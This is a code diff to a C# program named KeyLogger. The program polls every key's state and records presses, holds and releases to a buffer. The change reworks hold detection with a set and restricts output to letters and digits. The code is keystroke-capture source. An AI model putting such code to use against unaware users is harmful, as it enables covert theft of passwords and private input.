@@ -15,6 +15,7 @@ namespace KeyLogger
         {
             Dictionary<int, bool> lastFrame = new Dictionary<int, bool>();
             Dictionary<int, DateTime> holdStartTime = new Dictionary<int, DateTime>();
+            HashSet<int> wasHeld = new HashSet<int>();
 
             bool capsLockOn = ((GetKeyState(0x14) & 0x0001) != 0);
 
@@ -46,6 +47,7 @@ namespace KeyLogger
                     if (isDown && !wasDown)
                     {
                         holdStartTime[i] = DateTime.Now;
+                        wasHeld.Remove(i);
                         buffer.AppendLine($"[PRESSED] {keyStr}");
                     }
                     else if (isDown && wasDown)
@@ -53,17 +55,22 @@ namespace KeyLogger
                         if (holdStartTime.ContainsKey(i))
                         {
                             var duration = DateTime.Now - holdStartTime[i];
-                            if (duration.TotalMilliseconds >= 500)
+                            if (duration.TotalMilliseconds >= 500 && !wasHeld.Contains(i))
                             {
                                 buffer.AppendLine($"[HELD] {keyStr}");
-                                holdStartTime[i] = DateTime.MaxValue;
+                                wasHeld.Add(i);
                             }
                         }
                     }
                     else if (!isDown && wasDown)
                     {
-                        buffer.AppendLine($"[RELEASED] {keyStr}");
+                        if (wasHeld.Contains(i))
+                        {
+                            buffer.AppendLine($"[RELEASED] {keyStr}");
+                        }
+
                         holdStartTime.Remove(i);
+                        wasHeld.Remove(i);
                     }
 
                     lastFrame[i] = isDown;
@@ -83,6 +90,7 @@ namespace KeyLogger
                 Thread.Sleep(25);
             }
         }
+
 
 
         public static string checkExceptions(int i)
@@ -131,14 +139,10 @@ namespace KeyLogger
                 case 164: return "<Left Alt>";
                 case 165: return "<Right Alt>";
                 default:
-                    try
-                    {
+                    if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57))
                         return ((char)i).ToString();
-                    }
-                    catch
-                    {
-                        return $"<UNKNOWN {i}>";
-                    }
+                    else
+                        return null;
             }
         }
     }
